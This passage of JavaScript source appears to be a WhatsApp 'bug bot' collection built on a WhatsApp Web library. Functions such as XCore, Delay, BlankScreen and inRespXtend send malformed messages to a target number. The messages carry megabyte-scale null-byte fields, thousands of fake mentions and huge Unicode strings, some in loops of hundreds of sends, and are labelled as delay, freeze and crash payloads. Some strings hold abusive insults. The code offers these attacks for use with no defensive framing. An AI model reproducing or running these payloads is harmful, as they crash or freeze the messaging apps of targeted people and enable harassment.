    thumbnailSha256: 'QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=',
    thumbnailEncSha256: 'fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=',
    annotations: [{ embeddedContent: { audioMessage }, embeddedAction: true }],
  }

  const loops = opts.count ?? 1500
  for (let i = 0; i < loops; i++) {
    const msg = generateWAMessageFromContent(target, { viewOnceMessage: { message: { videoMessage } } }, {})
    await sock.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id, statusJidList: [target],
      additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }],
    })
    await sock.relayMessage(target, { groupStatusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } } }, { additionalNodes: [{ tag: 'meta', attrs: { is_status_mention: 'true' }, content: undefined }] })
    if (i < 99) await sleep(5000)
  }
  return loops
}

// delay invisible (1).js -> XCore
async function XCore(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: { message: {
      interactiveResponseMessage: {
        body: { text: '⭑̤⟅̊༑ ▾ 𝗔𝗠𝗘𝗟𝗜𝗔 𝗞𝗜𝗟𝗟 𝗬𝗢𝗨 ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑', format: 'DEFAULT' },
        nativeFlowResponseMessage: { name: 'galaxy_message', paramsJson: '\u0000'.repeat(1045000), version: 3 },
        contextInfo: { entryPointConversionSource: 'call_permission_request' },
      },
    } },
  }, { userJid: target, messageTimestamp: (Date.now() / 1000) | 0 })

  await sock.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key?.id || undefined,
    statusJidList: [target],
    additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target } }] }] }],
  }, { participant: target })
}

// Delay1.js -> Delay (1MB mentioned-jid flood, no temp files)
async function Delay(target) {
  const randJid = () => `"91${Math.floor(Math.random() * 1e10).toString().padStart(10, '0')}@s.whatsapp.net"`
  const jids = []
  let size = 0
  while (size < 1061432 - 50) {
    const j = randJid()
    jids.push(j)
    size += j.length + 3
  }
  const ui = 'ꦽ'.repeat(5000)
  const docMsg = {
    url: '', mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
    fileSha256: '', fileLength: '9999999999999', pageCount: 1316134911, mediaKey: '',
    fileName: '⛤', fileEncSha256: '', directPath: '', contactVcard: true, jpegThumbnail: '',
  }
  await sock.relayMessage(target, {
    ephemeralMessage: { message: {
      interactiveMessage: {
        header: { documentMessage: docMsg, hasMediaAttachment: true },
        body: { text: `⛤${ui}` },
        footer: { text: `⛤${ui}` },
        nativeFlowMessage: {},
        contextInfo: {
          mentionedJid: jids, mentions: jids, forwardingScore: 127, isForwarded: true,
          fromMe: false, participant: '0@s.whatsapp.net', remoteJid: 'status@broadcast',
          quotedMessage: { documentMessage: docMsg },
        },
      },
    } },
  }, { participant: { jid: target } })
}

// Delay2.js -> Delay2
async function Delay2(target) {
  await sock.relayMessage(target, {
    viewOnceMessage: { message: {
      interactiveResponseMessage: {
        body: { text: 'Xeuka', format: 'DEFAULT' },
        nativeFlowResponseMessage: { name: 'call_permission_request', paramsJson: '\u0000'.repeat(1000000), version: 3 },
      },
    } },
  }, { participant: { jid: target } })
}

// delayBeta.js / delay apk.js -> AmeliaBeta
async function AmeliaBeta(target) {
  const mentionedList = ['13135550002@s.whatsapp.net', ...randJids(2000)]
  const embeddedMusic = {
    musicContentMediaId: '589608164114571', songId: '870166291800508',
    author: 'Amelia Send Bug' + 'ោ៝'.repeat(10000), title: 'Amelia Modders',
    artworkDirectPath: '/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0',
    artworkSha256: 'u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=',
    artworkEncSha256: 'iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=',
    artistAttribution: 'https://www.instagram.com/_u/J.oxyy', countryBlocklist: true, isExplicit: true,
    artworkMediaKey: 'S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=',
  }
  const videoMsg = {
    videoMessage: {
      url: 'https://mmg.whatsapp.net/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0&mms3=true',
      mimetype: 'video/mp4', fileSha256: 'EY0PNB4nOae0b9/f+tNPB99rJSmJZ/Ns2SEfu7Jc8wI=',
      fileLength: '2534607', seconds: 8,
      mediaKey: 'YDQMBzXkapRZjXrPVAr2CwEPIBnv6aDHHQLaEYLOPyE=', height: 1280, width: 720,
      fileEncSha256: 'XcTQbrJvO9ICWDBnW8710Ow4QLbygfTUYzP3l0rg0no=',
      directPath: '/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc',
      mediaKeyTimestamp: '1757337021', jpegThumbnail: Buffer.from('...base64thumb...', 'base64'),
      contextInfo: { isSampled: true, mentionedJid: mentionedList },
      forwardedNewsletterMessageInfo: { newsletterJid: '120363321780343299@newsletter', serverMessageId: 1, newsletterName: 'Amelia Send Bug' },
      annotations: [{ embeddedContent: { embeddedMusic }, embeddedAction: true }],
    },
  }
  const stickerMsg = {
    viewOnceMessage: { message: {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0',
        fileSha256: 'xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=',
        fileEncSha256: 'zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=',
        mediaKey: 'nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=', mimetype: 'image/webp',
        directPath: '/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc',
        fileLength: { low: 1, high: 0, unsigned: true },
        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
        firstFrameLength: 19904, firstFrameSidecar: 'KN4kQ5pyABRAgA==', isAnimated: true,
        contextInfo: { mentionedJid: ['13135550002@s.whatsapp.net'], groupMentions: [], entryPointConversionSource: 'non_contact', entryPointConversionApp: 'whatsapp', entryPointConversionDelaySeconds: 467593 },
        stickerSentTs: { low: -1939477883, high: 406, unsigned: false }, isAvatar: true, isAiSticker: true, isLottie: true,
      },
    } },
  }
  const biji = await generateWAMessageFromContent(target, {
    viewOnceMessage: { message: {
      interactiveResponseMessage: {
        body: { text: 'Amelia Send Delay', format: 'DEFAULT' },
        nativeFlowResponseMessage: { name: 'call_permission_request', paramsJson: '\x10'.repeat(1045000), version: 3 },
        entryPointConversionSource: 'galaxy_message',
      },
    } },
  }, { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true, font: Math.floor(Math.random() * 99999999), background: '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '999999') })

  await sock.relayMessage('status@broadcast', biji.message, { messageId: biji.key.id, statusJidList: [target], additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }] })
  await sleep(1000)
  await sock.relayMessage('status@broadcast', videoMsg, { messageId: 'AmeliaBeta-' + Date.now(), statusJidList: [target], additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }] })
  await sleep(1000)
  await sock.relayMessage('status@broadcast', stickerMsg, { messageId: 'Sticker-' + Date.now(), statusJidList: [target] })
}

// delayv2.js -> buttonUiDelay
async function buttonUiDelay(target) {
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: { message: {
      buttonsMessage: {
        contentText: 'Ciee kena Delay' + 'ꦽ'.repeat(1030),
        footerText: 'Button Delay',
        buttons: [
          { buttonId: 'crash1', buttonText: { displayText: 'P' }, type: 1 },
          { buttonId: 'crash2', buttonText: { displayText: 'P' }, type: 1 },
          { buttonId: 'crash3', buttonText: { displayText: 'P' }, type: 1 },
        ],
        headerType: 1,
        contextInfo: {
          mentionedJid: ['6285215587438@s.whatsapp.net', ...randJids(1000, 1, 50000)],
          forwardingScore: 9999, isForwarded: true,
          externalAdReply: { title: ' X ', body: ' X ', mediaType: 1, renderLargerThumbnail: true, showAdAttribution: true },
        },
      },
    } },
  }, { participant: target })
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id })
}

// DelayInVis.js -> DelayInVis (1000-card carousel)
async function DelayInVis(target) {
  const push = []
  for (let r = 0; r < 1000; r++) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({ text: ' \u0000 ' }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: ' \u0003 ' }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: ' ', hasMediaAttachment: true,
        imageMessage: {
          url: 'https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true',
          mimetype: 'image/jpeg', fileSha256: '88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=',
          fileLength: '18352', height: 720, width: 1280,
          mediaKey: 'Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=',
          fileEncSha256: 'w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=',
          directPath: '/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc',
          mediaKeyTimestamp: '1737281900', jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEA',
          scansSidecar: 'hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==',
          scanLengths: [3537, 10557, 1905, 2353],
          midQualityFileSha256: 'gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=',
        },
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] }),
    })
  }
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: { message: {
      messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        body: proto.Message.InteractiveMessage.Body.create({ text: ' ' }),
        footer: proto.Message.InteractiveMessage.Footer.create({ text: '🍀TheZeroGetS3x' }),
        header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: push }),
      }),
    } },
  }, {})
  await sock.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key.id, statusJidList: [target],
    additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }],
  })
}

// delaynewBeta.js -> DelayNewBetaV3
async function DelayNewBetaV3(target, mention = false) {
  const mentionList = ['0@s.whatsapp.net', ...randJids(1900)]
  const aksara = 'ꦀ'.repeat(3000) + '\n' + 'ꦂ‎'.repeat(3000)
  let parse = true
  const SID = '5e03e0&mms3'
  const key = '10000000_2012297619515179_5714769099548640934_n.enc'
  if (11 > 9) parse = parse ? false : true

  const X = {
    musicContentMediaId: '589608164114571', songId: '870166291800508',
    author: '.Amelia' + 'ោ៝'.repeat(10000), title: 'Gtc',
    artworkDirectPath: '/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0',
    artworkSha256: 'u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=',
    artworkEncSha256: 'iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=',
    artistAttribution: 'https://www.instagram.com/_u/tamainfinity_', countryBlocklist: true, isExplicit: true,
    artworkMediaKey: 'S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=',
  }

  const tmsg = await generateWAMessageFromContent(target, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: { businessOwnerJid: '13135550002@s.whatsapp.net' },
        stanzaId: 'Amelia-Id' + Math.floor(Math.random() * 99999),
        forwardingScore: 100, isForwarded: true,
        forwardedNewsletterMessageInfo: { newsletterJid: '120363321780349272@newsletter', serverMessageId: 1, newsletterName: 'ោ៝'.repeat(10000) },
        mentionedJid: mentionList,
        quotedMessage: {
          callLogMesssage: { isVideo: true, callOutcome: '1', durationSecs: '0', callType: 'REGULAR', participants: [{ jid: '5521992999999@s.whatsapp.net', callOutcome: '1' }] },
          viewOnceMessage: { message: {
            stickerMessage: {
              url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
              fileSha256: 'xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=',
              fileEncSha256: 'zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=',
              mediaKey: 'nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=', mimetype: 'image/webp',
              directPath: '/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc',
              fileLength: { low: Math.floor(Math.random() * 200000000), high: 0, unsigned: true },
              mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
              firstFrameLength: 19904, firstFrameSidecar: 'KN4kQ5pyABRAgA==', isAnimated: true,
              stickerSentTs: { low: Math.floor(Math.random() * -20000000), high: 555, unsigned: parse },
              isAvatar: parse, isAiSticker: parse, isLottie: parse,
            },
          } },
          imageMessage: {
            url: 'https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true',
            mimetype: 'image/jpeg', caption: `</> Amelia Is Back!!! - ${aksara}`,
            fileSha256: 'Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=', fileLength: '19769', height: 354, width: 783,
            mediaKey: 'n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=',
            fileEncSha256: 'LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=',
            directPath: '/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc',
            mediaKeyTimestamp: '1743225419', jpegThumbnail: null,
            scansSidecar: 'mh5/YmcAWyLt5H2qzY3NtHrEtyM=', scanLengths: [2437, 17332],
            contextInfo: { isSampled: true, participant: target, remoteJid: 'status@broadcast', forwardingScore: 9999, isForwarded: true },
          },
        },
        annotations: [{ embeddedContent: { X }, embeddedAction: true }],
      },
    },
  }, {})

  await sock.relayMessage('status@broadcast', tmsg.message, {
    messageId: tmsg.key.id, statusJidList: [target],
    additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }],
  })
  if (mention) {
    await sock.relayMessage(target, { statusMentionMessage: { message: { protocolMessage: { key: tmsg.key, type: 25 } } } }, { additionalNodes: [{ tag: 'meta', attrs: { is_status_mention: 'true' }, content: undefined }] })
  }
}

// documentUrl.js -> docsxUrl (fixed invalid leading '>')
async function docsxUrl(target, Ptcp = true) {
  await sock.relayMessage(target, {
    ephemeralMessage: { message: {
      interactiveMessage: {
        header: {
          documentMessage: {
            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true',
            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
            fileSha256: 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
            fileLength: '9999999999999', pageCount: 1316134911,
            mediaKey: '45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=',
            fileName: '⭑̤⟅̊༑ ▾ 𝐙͢𝐄ͮ𝐑ͯ𝐎 ▾ ༑̴⟆̊⭑̤' + '𑜦𑜠'.repeat(1000),
            fileEncSha256: 'LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=',
            directPath: '/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc',
            mediaKeyTimestamp: '1726867151', contactVcard: true, jpegThumbnail: '',
          },
          hasMediaAttachment: true,
        },
        body: { text: '♱‌⃕𝐓‌𝐫ͯ𝐚͢𝐬𝐡!𝐙͢𝐞ͯ𝐭𝐬𝐮𝐒͢𝐮ͯ𝐱𝐨༑ ❗' },
        nativeFlowMessage: { buttons: [{ name: 'cta_url', buttonParamsJson: '{"display_text":"ⓘ ⸸zS","url":"http://wa.mE/stickerpack/TzS","merchant_url":"http://wa.mE/stickerpack/TzS"}' }] },
        contextInfo: { forwardingScore: 9999, isForwarded: true, fromMe: false, participant: '0@s.whatsapp.net', remoteJid: 'status@broadcast' },
      },
    } },
  }, Ptcp ? { participant: { jid: target } } : {})
}

// forceinvis.js -> PayloadFcVisible
async function PayloadFcVisible(target) {
  const venomModsData = JSON.stringify({
    status: true, criador: 'VenomMods',
    resultado: { type: 'md', ws: { _events: { 'CB:ib,,dirty': ['Array'] }, _eventsCount: 800000, _maxListeners: 0, url: 'wss://web.whatsapp.com/ws/chat', config: { version: ['Array'], browser: ['Array'], waWebSocketUrl: 'wss://web.whatsapp.com/ws/chat', sockCectTimeoutMs: 20000, keepAliveIntervalMs: 30000, logger: {}, printQRInTerminal: false, emitOwnEvents: true, defaultQueryTimeoutMs: 60000, customUploadHosts: [], retryRequestDelayMs: 250, maxMsgRetryCount: 5, fireInitQueries: true, auth: { Object: 'authData' }, markOnlineOnsockCect: true, syncFullHistory: true, linkPreviewImageThumbnailWidth: 192, transactionOpts: { Object: 'transactionOptsData' }, generateHighQualityLinkPreview: false, options: {}, appStateMacVerification: { Object: 'appStateMacData' }, mobile: true } } },
  })

  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: { message: {
      interactiveMessage: {
        header: { title: "You're beautiful៚", hasMediaAttachment: false },
        body: { text: "You're beautiful៚" },
        nativeFlowMessage: {
          messageParamsJson: '',
          buttons: [
            { name: 'single_select', buttonParamsJson: venomModsData + '\u0000' },
            { name: 'call_permission_request', buttonParamsJson: venomModsData + "You're beautiful៚" },
          ],
        },
      },
    } },
  }, {})
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id, participant: { jid: target } })

  const messageBetaXx = {
    viewOnceMessage: { message: {
      interactiveMessage: {
        header: { title: 'Lonte', hasMediaAttachment: false, locationMessage: { degreesLatitude: -999.03499999999999, degreesLongitude: 922.999999999999, name: 'VaxzyIsHere៚'.repeat(10000), address: 'ោ៝'.repeat(10000) } },
        body: { text: `VaxzyIsHere៚${'꧀'.repeat(2500)}.com - _ #` },
        nativeFlowMessage: { messageParamsJson: '{'.repeat(10000), buttons: Array(6).fill().map(() => ({ name: Math.random() > 0.5 ? 'mpm' : 'single_select', buttonParamsJson: '' })) },
      },
    } },
  }
  await sock.relayMessage(target, messageBetaXx, { participant: { jid: target } })

  const messageVxzXinvis = {
    ephemeralMessage: { message: {
      interactiveMessage: {
        header: { title: 'Anak Haram Kontol', hasMediaAttachment: false, locationMessage: { degreesLatitude: -999.03499999999999, degreesLongitude: 922.999999999999, name: 'VaxzyNotWhyy👀'.repeat(10000), address: 'ោ៝'.repeat(10000) } },
        body: { text: 'Hai Lontee😹' },
        nativeFlowMessage: { messageParamsJson: '{'.repeat(10000) },
        contextInfo: { participant: target, mentionedJid: ['0@s.whatsapp.net'] },
      },
    } },
  }
  await sock.relayMessage(target, messageVxzXinvis, { messageId: null, participant: { jid: target }, userJid: target })
}

// freze blank.js -> BlankScreen
async function BlankScreen(target) {
  let imagePayload = null
  try {
    imagePayload = await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/cfkh9x.jpg', gifPlayback: true } }, { upload: sock.waUploadToServer, mediaType: 'image' })
  } catch { /* offline-safe */ }

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      contextInfo: {
        mentionedJid: randJids(30000),
        isForwarded: true, forwardingScore: 9999,
        forwardedNewsletterMessageInfo: { newsletterJid: '120363331859075083@newsletter', newsletterName: 'ꦾ'.repeat(10000), serverMessageId: 1 },
      },
      header: { title: '', ...(imagePayload || {}), hasMediaAttachment: !!imagePayload },
      body: { text: '\u2063'.repeat(10000) },
      footer: { text: 'AMALIA KILL YOU' },
      nativeFlowMessage: {
        buttons: [
          { name: 'cta_url', buttonParamsJson: JSON.stringify({ display_text: 'ꦾ'.repeat(10000), url: 'ꦾ'.repeat(10000), merchant_url: '' }) },
          { name: 'galaxy_message', buttonParamsJson: JSON.stringify({ screen_1_TextInput_0: 'radio' + '\0'.repeat(10000), screen_0_Dropdown_1: 'Null', flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s.' }), version: 3 },
        ],
      },
    },
  }), { quoted: null })
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id })
}

// frezeChat.js -> inRespXtend
async function inRespXtend(target, mention = true, opts = {}) {
  const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: { message: {
      interactiveResponseMessage: {
        body: { text: '‼️⃟가이𝑺𝒏𝒊𝒕𝒉𝐸𝑥𝟹𝑐.', format: 'DEFAULT' },
        nativeFlowResponseMessage: { name: 'call_permission_request', paramsJson: '\x10'.repeat(1045000), version: 3 },
        entryPointConversionSource: 'galaxy_message',
      },
    } },
  }, { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true, font: Math.floor(Math.random() * 99999999), background: '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '999999') })

  const msg2 = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: 'ꦾ'.repeat(300000),
      contextInfo: { participant: target, mentionedJid: ['0@s.whatsapp.net', ...randJids(1900)] },
    },
  }, {})

  const loops = opts.count ?? 666
  for (let i = 0; i < loops; i++) {
    for (const msg of [msg1, msg2]) {
      await sock.relayMessage('status@broadcast', msg.message, {
        messageId: msg.key.id, statusJidList: [target],
        additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }],
      })
      await sleep(500)
      if (mention) {
        await sock.relayMessage(target, { statusMentionMessage: { message: { protocolMessage: { key: msg.key.id, type: 25 } } } }, {})
      }
    }
  }
  return loops
}

// invisibleX.js -> VisibleX / InVisibleX / CVisible / CInVisible
async function VisibleX(target) {
  const msg = await generateWAMessageFromContent(target, {
    buttonsMessage: {
      text: '🩸', contentText: '⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤',
      footerText: '𝐑𝐢𝐳𝐱𝐯𝐞𝐥𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ',
      buttons: [{ buttonId: '.null', buttonText: { displayText: ' #RizxvelzExec1St ' + '\u0000'.repeat(500000) }, type: 1 }],
      headerType: 1,
    },
  }, {})
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id, participant: { jid: target } })
}

async function InVisibleX(target, show = true) {
  const msg = await generateWAMessageFromContent(target, {
    buttonsMessage: {
      text: '🩸', contentText: '⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤',
      footerText: '𝐑𝐢𝐳𝐱𝐯𝐞𝐥𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ',
      buttons: [{ buttonId: '.null', buttonText: { displayText: ' #RizxvelzExec1St ' + '\u0000'.repeat(500000) }, type: 1 }],
      headerType: 1,
    },
  }, {})
  await sock.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key.id, statusJidList: [target],
    additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }],
  })
  if (show) {
    await sock.relayMessage(target, { groupStatusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } } }, { additionalNodes: [{ tag: 'meta', attrs: { is_status_mention: '🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉' }, content: undefined }] })
  }
}

async function CVisible(target) {
  await sock.relayMessage(target, {
    viewOnceMessage: { message: {
      interactiveResponseMessage: {
        body: { text: 'amelia modd', format: 'DEFAULT' },
        nativeFlowResponseMessage: { name: 'call_permission_request', paramsJson: '\u0000'.repeat(1000000), version: 3 },
      },
    } },
  }, { participant: { jid: target } })
}

async function CInVisible(target, show = true) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: { message: {
      interactiveResponseMessage: {
        body: { text: ' AmeliaModders', format: 'DEFAULT' },
        nativeFlowResponseMessage: { name: 'call_permission_request', paramsJson: '\u0000'.repeat(1000000), version: 3 },
      },
    } },
  }, {})
  await sock.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key.id, statusJidList: [target],
    additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }],
  })
  if (show) {
    await sock.relayMessage(target, { groupStatusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } } }, { additionalNodes: [{ tag: 'meta', attrs: { is_status_mention: '🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉' }, content: undefined }] })
  }
}

// InvisIos.js -> TrashLocIoSInVis
async function TrashLocIoSInVis(target) {
  const x = 60000
  const locationMessage = {
    locationMessage: {
      degreesLatitude: 21.1266, degreesLongitude: -11.8199,
      name: ' #4izxvelzExerc1st. ' + '\u0000'.repeat(x) + '𑇂𑆵𑆴𑆿'.repeat(x),
      address: 'https://t.me/rizxvelzexct',
      contextInfo: { externalAdReply: { title: '𑇂𑆵𑆴𑆿'.repeat(x), body: '𑇂𑆵𑆴𑆿'.repeat(x), mediaType: 1, thumbnailUrl: 'https://example.com/thumb.jpg', sourceUrl: 'https://t.me/rizxvelzexct', mediaUrl: 'https://example.com/media.jpg' } },
    },
  }
  const msg = await generateWAMessageFromContent('status@broadcast', {
    viewOnceMessage: { message: {
      messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
      locationMessage: locationMessage.locationMessage,
    } },
  }, {})
  await sock.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key.id, statusJidList: [target],
    additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }],
  })
  await sock.relayMessage(target, { groupStatusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } } }, { additionalNodes: [{ tag: 'meta', attrs: { is_status_mention: '#Location?-💰' }, content: undefined }] })
}

// Location.js -> LocaX
async function LocaX(target) {
  const generateLocationMessage = {
    viewOnceMessage: { message: {
      locationMessage: {
        degreesLatitude: 21.1266, degreesLongitude: -11.8199, name: 'x', url: 'https://t.me/XameliaXD',
        contextInfo: {
          mentionedJid: [target, ...randJids(1900)], isSampled: true, participant: target,
          remoteJid: 'status@broadcast', forwardingScore: 999999, isForwarded: true,
          quotedMessage: { extendedTextMessage: { text: '\u0000'.repeat(100000) } },
          externalAdReply: { advertiserName: 'whats !', title: 'your e idiot ?', body: '{ x.json }', mediaType: 1, renderLargerThumbnail: true, jpegThumbnail: null, sourceUrl: 'https://example.com' },
          placeholderKey: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: 'ABCDEF1234567890' },
        },
      },
      nativeFlowMessage: { buttons: [{ name: 'payment_method', buttonParamsJson: '{}' + '\u0000'.repeat(100000) }], messageParamsJson: '{}' },
    } },
  }
  const msg = generateWAMessageFromContent('status@broadcast', generateLocationMessage, {})
  await sock.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key.id, statusJidList: [target],
    additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target } }] }] }],
  }, { participant: target })
}

// lockinvis.js -> LocXz (location+extended freeze)
async function LocXz(target) {
